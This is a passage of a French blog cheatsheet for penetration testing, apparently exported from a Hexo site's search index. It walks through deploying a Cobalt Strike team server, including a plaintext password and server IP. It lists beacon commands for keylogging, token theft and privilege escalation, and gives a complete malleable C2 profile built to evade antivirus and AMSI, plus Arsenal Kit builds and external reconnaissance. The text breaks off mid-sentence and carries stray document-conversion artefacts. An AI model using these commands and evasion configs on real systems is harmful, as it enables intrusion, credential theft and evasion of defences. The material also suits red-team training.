<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Pentest CheatSheet</title>
    <link href="/2023/08/11/cheatsheet_pentest/"/>
    <url>/2023/08/11/cheatsheet_pentest/</url>
    
    <content type="html"><![CDATA[<p>Hello,<br>Je partage aujourd’hui une petite cheatsheet que j’ai faite au fil du temps et des cours des différentes certifications que j’ai obtenues. J’ajouterai du contenu avec le temps.</p><h2 id="Sommaire"><a href="#Sommaire" class="headerlink" title="Sommaire"></a>Sommaire</h2><blockquote><p>Cobalt Strike</p><p>Reconnaissance Externe</p><p>Persistance</p><p>Evasion</p><p>Privesc</p><p>Credential</p><p>Kerberos</p><p>MS SQL</p><p>DPAPI</p><p>Trust Domain</p></blockquote><h2 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h2><p>Pour lancer le <em>TeamServer</em> :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">raphgui@vps ~/cobalstrike &gt; sudo ./teamserver &lt;ip&gt; RaphguiCRTO!!<br></code></pre></td></tr></table></figure><p>Mettre le TeamServer en tant que service :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">raphgui@vps ~/cobalstrike &gt; sudo vim /etc/systemd/system/teamserver.service <br><br>Description=Cobalt Strike Team Server After=network.target StartLimitIntervalSec=0 <br><br>[Service] <br><br>Type=simple <br><br>Restart=always <br><br>RestartSec=1 <br><br>User=root <br><br>WorkingDirectory=/home/raphgui/cobaltstrike ExecStart=/home/raphgui/cobaltstrike/teamserver &lt;ip&gt; RaphguiCRTO! <br><br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><p>Relancer le system pour actualiser les Services :</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">raphgui<span class="hljs-keyword">@vps</span> ~/cobalstrike &gt; sudo systemctl daemon-reload <br>raphgui<span class="hljs-keyword">@vps</span> ~/cobalstrike &gt; sudo systemctl status teamserver.service ● teamserver.service - Cobalt Strike Team Server <br><br><span class="hljs-attribute">Loaded</span>: loaded (/etc/systemd/system/teamserver.service; disabled; vendor preset: enabled)      Active: inactive (dead)<br></code></pre></td></tr></table></figure><p>On va lancer le service “TeamServer”, puis regarder si il est bien actif</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>raphgui@vps:/home/raphgui/cobaltstrike &gt; sudo systemctl start teamserver.service <br><br>raphgui@vps:/home/raphgui/cobaltstrike &gt; sudo systemctl status teamserver.service                                  ● teamserver.ser vice - Cobalt Strike Team Server                                                                             Loaded: loaded (/etc/s ystemd/system/teamserver.service; disabled; vendor preset: enabled)                               Active: active (running) since Mo<br><br>n 2023-03-06 19:15:40 UTC; 9s ago                                                    Main PID: 86670 (teamserver)                     Tasks: 19 (limit: 2266)                                                                                                Memory: 69.6<br><br>M                                                                                                              CPU: 1.650s            CGroup: /system.slice/teamserver.service                                                                                        ├─8 6670 /bin/bash /home/raphgui/cobaltstrike/teamserver 54.36.102.43 &quot;RaphguiCRTO!&quot;                                     └─86671 ./Team ServerImage -Dcobaltstrike.server_port=50050 -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.ne&gt;                                         Mar 06 19:15:41 vps-24eb94c1 teamserver[86671]: [] Loading Windows error codes.                                        Mar 06 19:1 5:41 vps-24eb94c1 teamserver[86671]: [] Windows error codes loaded                                          Mar 06 19:15:41 vps-24e b94c1 teamserver[86671]: [] Loading beacons                                                     Mar 06 19:15:41 vps-24eb94c1 teamse rver[86671]: [] Loaded 4 beacons                                                    Mar 06 19:15:41 vps-24eb94c1 teamserver[86671]: [+] Team server is up on 0.0.0.0:50050                                  Mar 06 19:15:41 vps-24eb94c1 teamserver[86671]: [\*] SHA256<br><br>hash of SSL cert is: 56a06a233bd30f693de25ef12cc19e8b2c92d3e&gt;Mar 06 19:15:41 vps-24eb94c1 teamserver[86671]: [!] Web Server will u<br><br>se default SSL certificate (you don&#x27;t want this).  Mar 06 19:15:41 vps-24eb94c1 teamserver[86671]:         Use a valid SSL certific ate with Cobalt Strike: https://www.cob&gt;Mar 06 19:15:41 vps-24eb94c1 teamserver[86671]: [+] Listener: Backdoors started!              Mar 06 19:15:42 vps-24eb94c1 teamserver[86671]: [+] Listener: cat_lin started!<br></code></pre></td></tr></table></figure><p>Désormais plus qu’a mettre se service par défault :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">raphgui@vps/home/raphgui/cobaltstrike &gt; sudo systemctl enable teamserver.service !<br><br>Created symlink /etc/systemd/system/multi-user.target.wants/teamserver.service → /etc/systemd/system/teamserver.service<br></code></pre></td></tr></table></figure><h3 id="Les-fleches"><a href="#Les-fleches" class="headerlink" title="Les flèches"></a>Les flèches</h3><ul><li>Bleu &#x3D; TCP </li><li>Orange &#x3D; SMB </li><li>Purple or Red &#x3D; Disconnected</li></ul><h3 id="Commande"><a href="#Commande" class="headerlink" title="Commande"></a>Commande</h3><p>Lister les processus en cours :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">ps</span><br><br>[\*] This Beacon PID:    YELLOW 10732   <br><br>` `PID   PPID  Name                                   Arch  Session     User <br><br>` `---   ----  ----                                   ----  -------     ---- <br><br>` `0     0     [System Process]                                          <br><br>` `4     0         System                             x64   0            <br><br>` `148   4             Registry                       x64   0           NT AUTHORITY\SYSTEM <br><br>` `496   4             smss.exe                       x64   0           NT AUTHORITY\SYSTEM <br><br>` `1872  4             Memory Compression             x64   0           NT AUTHORITY\SYSTEM <br><br>` `664   584   csrss.exe                              x64   0           NT AUTHORITY\SYSTEM <br><br>` `760   584   wininit.exe                            x64   0           NT AUTHORITY\SYSTEM <br><br>` `544   760       fontdrvhost.exe                    x64   0           Font Driver Host\UMFD-0 <br><br>` `832   760       services.exe                       x64   0           NT AUTHORITY\SYSTEM <br><br>` `552   832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM <br><br>` `988   552               dllhost.exe                x86   1           NEXUSLITE-PC\Administrator <br><br>` `2080  552               WmiPrvSE.exe               x64   0           NT AUTHORITY\NETWORK SERVICE      3056  552               WmiPrvSE.exe               x64   0           NT AUTHORITY\SYSTEM <br><br>` `4256  552               RuntimeBroker.exe          x64   1           NEXUSLITE-PC\Administrator spose.Words.b8a8f815-686d-4082-ae71-ce7001721a24.017.png)<br><br>` `4616  552               dllhost.exe                x64   1           NEXUSLITE-PC\Administrator <br><br>` `5456  552               StartMenuExperienceHost.exe x64   1           NEXUSLITE-PC\Administrator  5464  552               ApplicationFrameHost.exe   x64   1           NEXUSLITE-PC\Administrator <br><br>` `5484  552               SystemSettings.exe         x64   1           NEXUSLITE-PC\Administrator <br><br>` `5616  552               RuntimeBroker.exe          x64   1           NEXUSLITE-PC\Administrator <br><br>` `5744  552               SearchApp.exe              x64   1           NEXUSLITE-PC\Administrator <br><br>` `6000  552               RuntimeBroker.exe          x64   1           NEXUSLITE-PC\Administrator <br><br>` `6564  552               TextInputHost.exe          x64   1           NEXUSLITE-PC\Administrator <br><br>` `6988  552               MoUsoCoreWorker.exe        x64   0           NT AUTHORITY\SYSTEM <br><br>` `7712  552               explorer.exe               x64   1           NEXUSLITE-PC\Administrator <br><br>` `10864 552               UserOOBEBroker.exe         x64   1           NEXUSLITE-PC\Administrator <br><br>` `1052  832           svchost.exe                    x64   0           NT AUTHORITY\NETWORK SERVICE  1136  832           vmnetdhcp.exe                  x86   0           NT AUTHORITY\SYSTEM <br><br>` `1204  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM <br><br>` `4104  1204              taskhostw.exe              x64   1           NEXUSLITE-PC\Administrator <br><br>` `4408  1204              sihost.exe                 x64   1           NEXUSLITE-PC\Administrator <br><br>` `4500  1204              taskhostw.exe              x64   1           NEXUSLITE-PC\Administrator <br><br>` `6864  1204              WDDiscoveryService.exe     x86   1           NEXUSLITE-PC\Administrator <br><br>` `10172 1204              WD Device Agent.exe        x86   1           NEXUSLITE-PC\Administrator <br><br>` `1228  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE<br></code></pre></td></tr></table></figure><h3 id="Enumerer-la-machine-AV-OS-info-…"><a href="#Enumerer-la-machine-AV-OS-info-…" class="headerlink" title="Enumérer la machine (AV, OS info …) :"></a>Enumérer la machine (AV, OS info …) :</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">execute-assembly D:\Tools\Enumerate Machine\Seatbelt\Seatbelt.exe -group=system spose.Words.b8a8f815-686d-4082-ae71-ce7001721a24.018.png)====== AntiVirus ======</span> <br><br>`  `Engine                         : Windows Defender <br><br>`  `ProductEXE                     : windowsdefender:// <br><br>`  `ReportingEXE                   : %ProgramFiles%\Windows Defender\MsMpeng.exe <br><br>====== AppLocker ====== <br><br>`  `[\*] AppIDSvc service is Stopped <br><br>`  `[\*] Applocker is not running because the AppIDSvc is not running   [\*] AppLocker not configured <br><br>====== AutoRuns ====== <br><br>`  `HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run : <br><br>`    `&quot;C:\Program Files (x86)\VMware\VMware Workstation\vmware-tray.exe&quot; <br><br>`    `C:\Program Files (x86)\Western Digital\Discovery\Current\WD Discovery.exe --autolaunch <br><br>====== DotNet ====== <br><br>`  `Installed CLR Versions       2.0.50727 <br><br>`      `4.0.30319 <br><br>`  `Installed .NET Versions       3.5.30729.4926 <br><br>`      `4.8.09037 <br><br>`  `Anti-Malware Scan Interface (AMSI) <br><br>`      `OS supports AMSI           : True <br><br>.NET version support AMSI   : True <br><br>`        `[!] The highest .NET version is enrolled in AMSI! <br><br>`        `[\*] You can invoke .NET version 3.5 to bypass AMSI. <br><br>====== OSInfo ====== <br><br>`  `Hostname                      :  NexusLite-PC <br><br>`  `Domain Name                   : <br><br>`  `Username                      :  NEXUSLITE-PC\Administrator <br><br>`  `ProductName                   :  Windows 10 Pro <br><br>`  `EditionID                     :  Professional <br><br>`  `ReleaseId                     :  2009 <br><br>`  `Build                         :  19045.2130 <br><br>`  `BuildBranch                   :  vb_release <br><br>`  `CurrentMajorVersionNumber     :  10 <br><br>`  `CurrentVersion                :  6.3 <br><br>`  `Architecture                  :  AMD64 <br><br>`  `ProcessorCount                :  12 <br><br>`  `IsVirtualMachine              :  False <br><br>`  `BootTimeUtc (approx)          :  3/7/2023 6:01:57 PM (Total uptime: 00:00:29:17) <br><br>`  `HighIntegrity                 :  True <br><br>`  `IsLocalAdmin                  :  True <br><br>`  `CurrentTimeUtc                :  3/7/2023 6:31:14 PM (Local time: 3/7/2023 7:31:14 PM)   TimeZone                      :  Romance Standard Time <br><br>`  `TimeZoneOffset                :  01:00:00 <br><br>`  `InputLanguage                 :  French spose.Words.b8a8f815-686d-4082-ae71-ce7001721a24.019.png)<br><br>`  `InstalledInputLanguages       :  French, US <br><br>`  `MachineGuid                   :  ee977fff-e274-44b0-8572-e3ac21d97ee4<br></code></pre></td></tr></table></figure><h3 id="KeyLogger"><a href="#KeyLogger" class="headerlink" title="KeyLogger"></a>KeyLogger</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">keylogger</span><br></code></pre></td></tr></table></figure><h3 id="Steal-Token-Process"><a href="#Steal-Token-Process" class="headerlink" title="Steal Token Process"></a>Steal Token Process</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">steal_token &lt;pid&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Creer-un-token"><a href="#Creer-un-token" class="headerlink" title="Créer un token"></a>Créer un token</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">make_token DOMAIN\user Password![ref1]</span><br></code></pre></td></tr></table></figure><h3 id="Retirer-le-token-actuel"><a href="#Retirer-le-token-actuel" class="headerlink" title="Retirer le token actuel :"></a>Retirer le token actuel :</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">rev2self![ref2]</span><br></code></pre></td></tr></table></figure><h3 id="Privesc-CS"><a href="#Privesc-CS" class="headerlink" title="Privesc CS  :"></a>Privesc CS  :</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">elevate &lt;choice-privesc&gt; &lt;listeners&gt;</span> <br><span class="hljs-meta prompt_">beacon&gt; </span><span class="language-bash">elevate svc-exe https</span><br></code></pre></td></tr></table></figure><h3 id="Duplicate-Beacon"><a href="#Duplicate-Beacon" class="headerlink" title="Duplicate Beacon :"></a>Duplicate Beacon :</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">beacon&gt; spawn x64 <span class="hljs-keyword">https</span><br></code></pre></td></tr></table></figure><h3 id="Malleable-Profile"><a href="#Malleable-Profile" class="headerlink" title="Malleable Profile :"></a>Malleable Profile :</h3><figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs profile">set sample_name <span class="hljs-string">&quot;Raphgui Profile&quot;</span>;<br>set sleeptime <span class="hljs-string">&quot;2&quot;</span>;<br>set jitter    <span class="hljs-string">&quot;20&quot;</span>;<br>set useragent <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36&quot;</span>;<br>set host_stage <span class="hljs-string">&quot;false&quot;</span>;<br><br><br>http-get &#123;<br><br>    set uri <span class="hljs-string">&quot;/&quot;</span>;<br><br>    client &#123;<br><br>        header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;*/*&quot;</span>;<br>        header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>;<br>        header <span class="hljs-string">&quot;Content-Transfer-Encoding&quot;</span> <span class="hljs-string">&quot;base64&quot;</span>;<br>        header <span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-string">&quot;Keep-Alive&quot;</span>;<br><br>        metadata &#123;<br>            netbiosu;<br>            uri-append;<br>        &#125;<br>    &#125;<br><br>    server &#123;<br><br>        header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;nginx/2.2.5&quot;</span>;<br>        header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;text/html&quot;</span>;<br>        header <span class="hljs-string">&quot;X-Powered-By&quot;</span> <span class="hljs-string">&quot;PHP/8.0&quot;</span>;<br>        header <span class="hljs-string">&quot;Vary&quot;</span> <span class="hljs-string">&quot;Accept-Encoding&quot;</span>;<br><br>        output &#123;<br>            base64;<br>            print;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br>http-post &#123;<br><br>    set uri <span class="hljs-string">&quot;/fa34ec71c20ec011297589715c145faa058f76c6&quot;</span>;<br><br>    client &#123;<br>    <br>        header <span class="hljs-string">&quot;Accept&quot;</span> <span class="hljs-string">&quot;*/*&quot;</span>;<br>        header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>;<br>        header <span class="hljs-string">&quot;Content-Transfer-Encoding&quot;</span> <span class="hljs-string">&quot;base64&quot;</span>;<br>        header <span class="hljs-string">&quot;Connection&quot;</span> <span class="hljs-string">&quot;Keep-Alive&quot;</span>;<br><br>        id &#123;<br>            parameter <span class="hljs-string">&quot;id&quot;</span>;<br>        &#125;<br><br>        output &#123;<br>            base64;<br>            print;<br>        &#125;<br>    &#125;<br><br>    server &#123;<br><br>        header <span class="hljs-string">&quot;Server&quot;</span> <span class="hljs-string">&quot;nginx/1.2.5&quot;</span>;<br>        header <span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-string">&quot;text/html&quot;</span>;<br>        header <span class="hljs-string">&quot;X-Powered-By&quot;</span> <span class="hljs-string">&quot;PHP/8.0&quot;</span>;<br>        header <span class="hljs-string">&quot;Vary&quot;</span> <span class="hljs-string">&quot;Accept-Encoding&quot;</span>;<br><br>        output &#123;<br>            base64;<br>            print;<br>        &#125;<br>    &#125;<br>&#125;<br><br>stage &#123;<br>    set userwx         <span class="hljs-string">&quot;false&quot;</span>;<br>    set stomppe        <span class="hljs-string">&quot;true&quot;</span>;<br>    set obfuscate      <span class="hljs-string">&quot;true&quot;</span>;<br>    set sleep_mask      <span class="hljs-string">&quot;true&quot;</span>;<br>    set name           <span class="hljs-string">&quot;explorer.dll&quot;</span>;<br>    set cleanup        <span class="hljs-string">&quot;true&quot;</span>;<br><br>    # Values captured using peclone against a Windows <span class="hljs-number">10</span> version of explorer.exe<br>    set checksum        &quot;0&quot;;<br>    set compile_time    &quot;11 Nov 2016 04:<span class="hljs-number">08</span>:<span class="hljs-number">32</span><span class="hljs-string">&quot;;</span><br><span class="hljs-string">    set entry_point     &quot;</span><span class="hljs-number">650688</span><span class="hljs-string">&quot;;</span><br><span class="hljs-string">set image_size_x86  &quot;</span><span class="hljs-number">4661248</span><span class="hljs-string">&quot;;</span><br><span class="hljs-string">set image_size_x64  &quot;</span><span class="hljs-number">4661248</span><span class="hljs-string">&quot;;</span><br><span class="hljs-string">set rich_header     &quot;</span>\x3e\x98\xfe\x75\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x73\x81\x03\x26\xfc\xf9\x90<span class="hljs-string">&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # transform the x64 rDLL stage</span><br><span class="hljs-string">    transform-x64 &#123;</span><br><span class="hljs-string">        strrep &quot;</span>This program cannot be run in DOS mode<span class="hljs-string">&quot; &quot;</span><span class="hljs-string">&quot;;</span><br><span class="hljs-string">        strrep &quot;</span>beacon.x64.dll&quot; &quot;not-beacon.dll&quot;;<br>        strrep &quot;ReflectiveLoader&quot; &quot;LoadData&quot;;<br>    &#125;<br>    <br>&#125;<br><br>post-ex &#123;<br>    set amsi_disable &quot;true&quot;;<br><br>    set spawnto_x86 &quot;%windir%\\syswow64\\notepad.exe&quot;;<br>    set spawnto_x64 &quot;%windir%\\sysnative\\notepad.exe&quot;;<br><br>    set pipename &quot;totally_not_beacon, legitPipe_##&quot;;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Compiler-l’Arsenal-Kit"><a href="#Compiler-l’Arsenal-Kit" class="headerlink" title="Compiler l’Arsenal Kit :"></a>Compiler l’Arsenal Kit :</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./build.sh pipe VirtualAlloc 277492 5 true true /mnt/c/Tools/cobaltstrike/artifacts<br></code></pre></td></tr></table></figure><h3 id="Load-Arsenal-Kit"><a href="#Load-Arsenal-Kit" class="headerlink" title="Load Arsenal Kit :"></a>Load Arsenal Kit :</h3><blockquote><p>Cobalt Strike </p><p>Load Script</p><p>path&#x2F;to&#x2F;script&#x2F;artefact.cnas</p></blockquote><h3 id="Ressource-Kit"><a href="#Ressource-Kit" class="headerlink" title="Ressource Kit :"></a>Ressource Kit :</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/build.sh /m</span>nt<span class="hljs-regexp">/c/</span>Tools<span class="hljs-regexp">/cobaltstrike/</span>resources<br></code></pre></td></tr></table></figure><h2 id="Reconnaissance-Externe"><a href="#Reconnaissance-Externe" class="headerlink" title="Reconnaissance Externe"></a>Reconnaissance Externe</h2><h3 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h3><p>Pour commencer nous pouvons utiliser <em>”dig”</em> pour obtenir des informations  :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">raphgui@vps ~&gt; dig saawaru.com                                                                                                        <br><br>- &lt;&lt;&gt;&gt; DiG 9.18.1-1ubuntu1.3-Ubuntu &lt;&lt;&gt;&gt; saawaru.com                                                                                  ;; global options: +cmd                                                                                                               ;; Got answer:                                                                                                                        ;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 22803                                                                             ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1                                                                  ;; OPT PSEUDOSECTION:                                                                                                                 <br>- EDNS: version: 0, flags:; udp: 65494                                                                                                ;; QUESTION SECTION:                                                                                                                  ;saawaru.com.                   IN      A                                                                                             ;; ANSWER SECTION:                                                                                                                    saawaru.com.            3582    IN      A       54.36.102.43                                                                          <br></code></pre></td></tr></table></figure><h3 id="Enumerer-les-subdomains"><a href="#Enumerer-les-subdomains" class="headerlink" title="Enumérer les subdomains :"></a>Enumérer les subdomains :</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">raphgui@vps ~&gt; python3 dnscan.py -d saawaru.com -w subdomains-100.txtspose.Words.b8a8f815-686d-4082-ae71-ce7001721a24.031.png)<br></code></pre></td></tr></table></figure><h3 id="DNS-SPOOFING"><a href="#DNS-SPOOFING" class="headerlink" title="DNS SPOOFING"></a>DNS SPOOFING</h3><p><a href="https://github.com/MattKeeley/Spoofy">DNS spoofing :</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">raphgui@vps ~&gt; python3 spoofy.py -d saawaru.com -o stdout spose.Words.b8a8f815-686d-4082-ae71-ce7001721a24.032.png)[\*] Domain: saawaru.com <br><br>[\*] Is subdomain: False <br><br>[\*] DNS Server: 1.1.1.1 <br><br>[?] No SPF record found. <br><br>[?] No DMARC record found. <br><br>[+] Spoofing possible for saawaru.com<br></code></pre></td></tr></table></figure><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><p>Pour commencer : </p><p>raphgui@vps ~&gt; nmap -p- <ip> -T5spose.Words.b8a8f815-686d-4082-ae71-ce7001721a24.033.png)</p><p>En fonction des ports 